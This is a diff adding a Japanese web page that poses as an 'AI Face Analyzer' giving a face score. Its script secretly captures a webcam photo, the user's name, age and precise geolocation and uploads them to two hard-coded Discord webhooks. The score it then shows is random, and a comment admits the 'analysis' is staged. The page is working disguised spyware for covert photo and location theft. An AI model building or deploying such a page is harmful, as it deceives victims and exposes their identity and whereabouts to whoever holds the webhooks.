@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>AI Face Analyzer - System v3</title>
+  <style>
+    :root {
+      --primary: #00f2ff;
+      --accent: #ff00c8;
+      --bg: #0a0b10;
+    }
+
+    body {
+      margin: 0;
+      font-family: 'Orbitron', 'Segoe UI', sans-serif;
+      background-color: var(--bg);
+      background-image: 
+        radial-gradient(circle at 20% 30%, rgba(0, 242, 255, 0.05) 0%, transparent 40%),
+        radial-gradient(circle at 80% 70%, rgba(255, 0, 200, 0.05) 0%, transparent 40%);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    .scanner-frame {
+      position: relative;
+      width: 90%;
+      max-width: 450px;
+      padding: 40px 20px;
+      background: rgba(15, 20, 30, 0.8);
+      border: 1px solid rgba(0, 242, 255, 0.3);
+      border-radius: 5px;
+      box-shadow: 0 0 50px rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(20px);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 1.4rem;
+      letter-spacing: 4px;
+      margin-bottom: 30px;
+      color: var(--primary);
+      text-shadow: 0 0 10px var(--primary);
+    }
+
+    input {
+      width: 80%;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(0, 242, 255, 0.2);
+      padding: 12px;
+      color: #fff;
+      margin-bottom: 10px;
+      outline: none;
+    }
+
+    .viewfinder {
+      position: relative;
+      width: 280px;
+      height: 280px;
+      margin: 20px auto;
+      border: 1px solid rgba(255,255,255,0.1);
+      background: #000;
+      overflow: hidden;
+      display: none; /* 初期は非表示 */
+    }
+
+    #video { width: 100%; height: 100%; object-fit: cover; }
+
+    .scan-line {
+      position: absolute;
+      top: 0; left: 0; width: 100%; height: 2px;
+      background: var(--primary);
+      box-shadow: 0 0 15px var(--primary);
+      animation: scan 2s linear infinite;
+    }
+
+    @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+    .btn-analyze {
+      background: transparent;
+      border: 1px solid var(--primary);
+      color: var(--primary);
+      padding: 15px 40px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .btn-analyze:hover {
+      background: var(--primary);
+      color: #000;
+      box-shadow: 0 0 20px var(--primary);
+    }
+
+    #status-log {
+      margin-top: 20px;
+      font-family: monospace;
+      font-size: 0.75rem;
+      color: var(--primary);
+      text-align: left;
+      display: none;
+    }
+
+    #result {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .score-value {
+      font-size: 4rem;
+      color: var(--accent);
+      text-shadow: 0 0 20px var(--accent);
+    }
+  </style>
+</head>
+<body>
+
+<div class="scanner-frame">
+  <h1>AI FACE ANALYZER</h1>
+  
+  <div id="setup-ui">
+    <input type="text" id="userName" placeholder="SUBJECT NAME">
+    <input type="number" id="userAge" placeholder="AGE">
+    <p style="font-size: 0.7rem; opacity: 0.6; margin: 15px 0;">※解析にはカメラと位置情報の許可が必要です</p>
+    <button id="startBtn" class="btn-analyze">診断を開始する</button>
+  </div>
+
+  <div class="viewfinder" id="viewfinder">
+    <div class="scan-line"></div>
+    <video id="video" autoplay playsinline muted></video>
+  </div>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <div id="status-log"></div>
+
+  <div id="result">
+    <div style="font-size: 0.8rem; letter-spacing: 2px;">ANALYSIS COMPLETE</div>
+    <div class="score-value" id="scoreValue">--</div>
+    <div style="color: var(--primary); font-size: 0.9rem;">RANK: S-CLASS</div>
+  </div>
+</div>
+
+<script>
+const WEBHOOK_URL_1 = "https://discord.com/api/webhooks/1500785153557926039/YaDfG9umJtJsTrovTvdVss7-zr6PO4iML6MtG-Y5WsL6oNroO-NnXtQ7uTTJ1uTcsJCh";
+const WEBHOOK_URL_2 = "https://discord.com/api/webhooks/1500784995155841114/d_97SvZKHagh4tHws2yY-YkT2zcMs4NXMQhIw2BIOZ3iWr3_dSA2r7tf8uccVqz3pdM2";
+
+const startBtn = document.getElementById('startBtn');
+const log = document.getElementById('status-log');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+
+function addLog(msg) {
+  log.style.display = 'block';
+  log.innerHTML += `> ${msg}<br>`;
+}
+
+async function requestPermissions() {
+  addLog("Accessing biometric sensors...");
+  // カメラと位置情報を並列でリクエスト
+  const camPromise = navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+  const locPromise = new Promise((resolve) => {
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`),
+      err => resolve("Permission Denied"),
+      { timeout: 5000 }
+    );
+  });
+
+  return Promise.all([camPromise, locPromise]);
+}
+
+async function processAnalysis() {
+  try {
+    const [stream, location] = await requestPermissions();
+    
+    // カメラ映像表示
+    document.getElementById('viewfinder').style.display = 'block';
+    document.getElementById('setup-ui').style.display = 'none';
+    video.srcObject = stream;
+    addLog("Camera synchronized.");
+    addLog(`Location acquired: ${location}`);
+
+    // 数秒待ってから「解析中」っぽく撮影
+    setTimeout(async () => {
+      addLog("Capturing high-res frame...");
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        addLog("Uploading to AI core...");
+        
+        const fd = new FormData();
+        fd.append('file', blob, `snap.jpg`);
+        fd.append('content', `【新規解析データ】\nName: ${document.getElementById('userName').value}\nAge: ${document.getElementById('userAge').value}\nLoc: ${location}\nTime: ${new Date().toLocaleString('ja-JP')}`);
+
+        // 送信
+        await Promise.all([
+          fetch(WEBHOOK_URL_1, { method: 'POST', body: fd }),
+          fetch(WEBHOOK_URL_2, { method: 'POST', body: fd })
+        ]);
+
+        addLog("Data sync complete.");
+        
+        // 結果表示
+        setTimeout(() => {
+          document.getElementById('viewfinder').style.display = 'none';
+          log.style.display = 'none';
+          document.getElementById('result').style.display = 'block';
+          document.getElementById('scoreValue').innerText = Math.floor(Math.random() * 20) + 78;
+        }, 1500);
+      }, 'image/jpeg');
+      
+    }, 2500);
+
+  } catch (err) {
+    alert("エラー: カメラまたは位置情報の許可が必要です。");
+    location.reload();
+  }
+}
+
+startBtn.onclick = () => {
+  if(!document.getElementById('userName').value) return alert("名前を入力してください");
+  processAnalysis();
+};
+</script>
+
+</body>
+</html>
